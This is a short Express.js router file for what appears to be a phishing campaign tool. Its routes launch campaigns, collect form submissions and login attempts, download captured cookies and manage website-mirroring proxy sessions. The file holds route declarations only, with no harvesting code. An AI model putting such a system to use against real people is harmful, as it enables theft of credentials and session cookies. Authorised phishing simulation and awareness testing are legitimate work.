const express = require('express');
const router = express.Router();
const campaignController = require('../controllers/campaignController');

// Campaign routes
router.post('/SaveCampaign', campaignController.saveCampaign);
router.get('/GetCampaigns', campaignController.getCampaigns);
router.delete('/DeleteCampaign/:id', campaignController.deleteCampaign);
router.post('/LaunchCampaign/:id', campaignController.launchCampaign);
router.post('/CloseCampaign/:id', campaignController.closeCampaign);
router.get('/GetCampaignLogs/:id', campaignController.getCampaignLogs);
router.get('/GetFormSubmissions/:id', campaignController.getFormSubmissions);
router.get('/GetLoginAttempts/:id', campaignController.getLoginAttempts);
router.get('/DownloadCookies/:id', campaignController.downloadCookies);

// Website mirroring routes
router.get('/GetMirrorSession/:campaignId', campaignController.getMirrorSession);
router.post('/StopMirrorSession/:sessionId', campaignController.stopMirrorSession);
router.get('/track-mirror-view/:sessionId', campaignController.trackMirrorView);
router.get('/proxy-monitor/:sessionToken', campaignController.handleProxyMonitor);

module.exports = router;